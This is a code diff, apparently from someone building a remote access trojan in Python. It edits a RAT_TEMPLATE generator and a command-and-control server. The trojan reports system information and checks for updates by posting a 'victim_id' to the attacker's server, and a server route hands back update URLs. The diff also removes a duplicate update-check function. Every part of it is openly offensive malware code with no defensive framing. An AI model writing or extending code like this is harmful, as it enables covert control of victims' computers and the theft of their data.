@@ -1,7 +1,12 @@
-# Add a version variable
+import os
+import sys
+import subprocess
+import shutil
+import tempfile
+import argparse
+
 VERSION = "1.0.0"
 
-# Modify the RAT_TEMPLATE to include the version
 RAT_TEMPLATE = '''import os, sys, time, platform, socket, uuid, json, traceback
 from urllib import request, error as urllib_error
 from datetime import datetime
@@ -156,7 +161,7 @@ def get_system_info():
 
 def check_for_updates():
     try:
-        response = http_post(f"{SERVER}/api/update", {"victim_id": VICTIM_ID})
+        response = http_post(f"{SERVER}/api/update/{VICTIM_ID}", {})
         if response and response.get('success'):
             update_url = response.get('update_url')
             if update_url:
@@ -409,16 +414,3 @@ def api_get_update(victim_id):
     except Exception as e:
         print(f"Get update error: {e}")
         return jsonify({'success': False, 'error': 'Server error'}), 500
-
-# Modify the RAT to check for updates
-def check_for_updates():
-    try:
-        response = http_post(f"{SERVER}/api/update/{VICTIM_ID}", {})
-        if response and response.get('success'):
-            update_url = response.get('update_url')
-            if update_url:
-                log(f"Update available: {update_url}")
-                # Implement download and update logic here
-                # Example: download the new executable and replace the current one
-    except Exception as e:
-        log(f"Update check error: {str(e)}")
